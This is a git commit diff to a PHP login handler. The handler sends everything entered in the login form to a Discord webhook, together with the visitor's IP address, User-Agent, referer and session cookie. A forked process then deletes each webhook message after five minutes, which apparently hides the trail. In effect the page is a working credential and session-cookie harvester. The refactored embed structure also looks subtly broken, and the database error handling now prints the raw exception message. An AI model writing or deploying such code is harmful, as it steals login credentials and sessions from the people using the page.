68c8d0c8235f3f497a2ff8f6760a5ce7526a36e3
Yuu Komiya <8064928+n138-kz@users.noreply.github.com>
2026-08-08 11:08:56 +0900

    function sendDiscordWebhook

--- docs/login.php
+++ docs/login.php
@@ -5,6 +5,38 @@ session_start([
     'use_strict_mode' => true,
 ]);
 
+function sendDiscordWebhook($webhookUrl, $payload) {
+    $url = $webhookUrl . '?wait=true';
+
+    $curl_req = curl_init($url);
+    curl_setopt($curl_req, CURLOPT_POST, true);
+    curl_setopt($curl_req, CURLOPT_POSTFIELDS, json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
+    curl_setopt($curl_req, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl_req, CURLOPT_HTTPHEADER, [
+        'Content-Type: application/json',
+    ]);
+    $curl_result = json_decode(curl_exec($curl_req), true);
+
+    {
+        /* *https://zenn.dev/niisan/articles/cb3cedeeaf3ed7* */
+        $pid = pcntl_fork();
+        if ($pid === 0) {
+            sleep(300);
+            $curl_req = curl_init(explode('?', $url)[0].'/messages/'.$curl_result['id']);
+            curl_setopt($curl_req, CURLOPT_CUSTOMREQUEST, 'DELETE');
+            curl_setopt($curl_req, CURLOPT_HTTPHEADER, [
+                'Content-Type: application/json',
+            ]);
+            curl_setopt($curl_req, CURLOPT_RETURNTRANSFER, true);
+            $curl_result = json_decode(curl_exec($curl_req), true);
+        } else if ($pid === -1) {
+            throw new RuntimeException('プロセスの作成に失敗した模様');
+        }
+    }
+
+    return null;
+}
+
 header('Content-Type: application/json; charset=UTF-8');
 
 if (file_exists(__DIR__ . '/vendor/autoload.php')) {
@@ -38,9 +70,9 @@ $config = [
         $pdo = new PDO($dsn, $user, $pass, [
             PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
         ]);
-        echo "PostgreSQL Connection: OK";
     } catch (PDOException $e) {
-        echo "PostgreSQL Connection Failed: " . $e->getMessage().PHP_EOL;
+
+        die("System Error: " . $e->getMessage());
     }
 }
 
@@ -56,44 +88,18 @@ $input = json_decode(file_get_contents('php://input'), true);
     $input['formdata']['g-recaptcha-response']['issued_at'] = $input['formdata']['g-recaptcha-response']['issued_at'] ?? null;
 }
 {
-    $url = $config['discord']['webhook_url'] . '?wait=true';
-    $content = "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```";
-    $embed = [
-        'title' => 'ユーザー名: ' . ($input['formdata']['dlym6tweiywa2taq']['value'] ?? null),
-        'description' => 'IPアドレス: ' . ($_SERVER['REMOTE_ADDR'] ?? null) . "\n" .
-                         'User-Agent: ' . ($_SERVER['HTTP_USER_AGENT'] ?? null) . "\n" .
-                         'Referer: ' . ($_SERVER['HTTP_REFERER'] ?? null) . "\n" .
-                         'Timestamp: ' . date('Y-m-d H:i:s') . "\n" .
-                         'Cookie: ' . ($_COOKIE['SID'] ?? null),
-        'color' => hexdec('333333'),
-        'timestamp' => date('c'),
+    $payload = [
+        'content' => "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```",
+        'embeds' => [
+            'title' => 'ユーザー名: ' . ($input['formdata']['dlym6tweiywa2taq']['value'] ?? null),
+            'description' => 'IPアドレス: ' . ($_SERVER['REMOTE_ADDR'] ?? null) . "\n" .
+                            'User-Agent: ' . ($_SERVER['HTTP_USER_AGENT'] ?? null) . "\n" .
+                            'Referer: ' . ($_SERVER['HTTP_REFERER'] ?? null) . "\n" .
+                            'Timestamp: ' . date('Y-m-d H:i:s') . "\n" .
+                            'Cookie: ' . ($_COOKIE['SID'] ?? null),
+            'color' => hexdec('333333'),
+            'timestamp' => date('c'),
+        ],
     ];
-    $curl_req = curl_init($url);
-    curl_setopt($curl_req, CURLOPT_POST, true);
-    curl_setopt($curl_req, CURLOPT_POSTFIELDS, json_encode(['content' => $content, 'embeds' => [$embed]], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
-    curl_setopt($curl_req, CURLOPT_HTTPHEADER, [
-        'Content-Type: application/json',
-    ]);
-    curl_setopt($curl_req, CURLOPT_RETURNTRANSFER, true);
-    $curl_result = json_decode(curl_exec($curl_req), true);
-    echo json_encode($curl_result, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT).PHP_EOL;
-
-    {
-        /* *https://zenn.dev/niisan/articles/cb3cedeeaf3ed7* */
-        $pid = pcntl_fork();
-        if ($pid === 0) {
-            sleep(300);
-            $curl_req = curl_init(explode('?', $url)[0].'/messages/'.$curl_result['id']);
-            curl_setopt($curl_req, CURLOPT_CUSTOMREQUEST, 'DELETE');
-            curl_setopt($curl_req, CURLOPT_HTTPHEADER, [
-                'Content-Type: application/json',
-            ]);
-            curl_setopt($curl_req, CURLOPT_RETURNTRANSFER, true);
-            $curl_result = json_decode(curl_exec($curl_req), true);
-        } else if ($pid === -1) {
-            throw new RuntimeException('プロセスの作成に失敗した模様');
-        }
-
-    }
-
+    sendDiscordWebhook($config['discord']['webhook_url'], $payload);
 }
